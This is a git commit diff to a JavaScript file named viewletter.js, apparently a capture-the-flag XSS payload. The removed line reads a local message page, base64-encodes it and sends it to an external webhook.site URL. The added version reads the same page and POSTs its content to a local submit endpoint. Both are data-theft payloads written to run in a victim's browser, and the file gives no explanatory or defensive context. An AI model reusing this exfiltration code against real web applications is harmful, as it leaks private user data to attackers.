66912fe71642b6ea25562ad21f251e6174bd634e
William957-web <85293841+William957-web@users.noreply.github.com>
2024-04-18 09:11:46 +0800

    Update viewletter.js

--- viewletter.js
+++ viewletter.js
@@ -1,1 +1,13 @@
-fetch("http://127.0.0.1:80/message/3").then(res => {return res.text()}).then(res=>btoa(res)).then(res => fetch("http://webhook.site/ae5a8c4b-5567-4da6-abbf-cbb4908426fe?true="+res))
+fetch("http://127.0.0.1/message/3").then((r) => {
+
+    return r.text();
+
+}).then((x) => {
+    fetch("http://127.0.0.1/submit", {
+        "headers": {
+            "content-type": "application/json"
+        },
+        "body": x,
+        "method": "POST",
+    });
+});
